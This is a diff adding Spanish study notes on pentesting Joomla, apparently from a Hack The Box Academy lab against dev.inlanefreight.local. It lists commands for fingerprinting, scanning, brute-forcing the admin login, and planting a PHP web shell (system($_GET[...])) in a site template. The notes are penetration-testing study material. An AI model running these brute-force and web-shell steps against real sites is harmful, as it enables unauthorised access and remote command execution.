@@ -1,0 +1,42 @@
+	### Joomla
+CMS del 2005 para foro, galeria fotograficas, e-commerce, etc. Escrito en PHP usa MySQL.
+Puede tener extensiones y templates.
+
+	## Footprinting
+curl -s http://dev.inlanefreight.local/ | grep Joomla
+#El output suele ser metadata con info de si se usa Joomla.
+
+academy.hackthebox.com/module/113/section/1095
+#El output de robots.txt de Joomla es como el que se ve en esta paginaa
+
+curl -s http://dev.inlanefreight.local/README.txt | head -n 5
+#Favicon de Joomla. No siempre lo devuelve.
+
+curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
+#Permite obtener el output del archivo xml con la informacion de si es Joomla o no, version, etc
+
+
+	## Enumeracion
+sudo pip3 install droopescan
+droopescan scan joomla --url http://dev.inlanefreight.local/
+#Escaner que trabaja con funcionalidad limitada para Joomla. Funciona con SilverStripe, WordPress y Drupal.
+
+sudo python2.7 -m pip install urllib3
+sudo python2.7 -m pip install certifi
+sudo python2.7 -m pip install bs4
+python2.7 joomlascan.py -u http://dev.inlanefreight.local
+#Un poco desactualizado pero funciona bien. Es un scaner para Joomla y encontrar directiorios accesibles con archivos.
+
+dev.inlanefreight.local/administrator/index.php
+#Login administrador. Default user es admin. La passwd se crea en la instalacion.
+sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
+#Bruteforce para Joomla
+
+	## Abusing: Code execution
+template > configuration > protostar
+#(Ante problemas visitar modulo htb) Esto nos da la pagina de customizacion de los tamplets
+system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
+#Agregamos la shell en el template para poder ejecutar comandos
+
+	## Abusing: Knowgn vulns
+Research en versiones de Joomla para CVS's
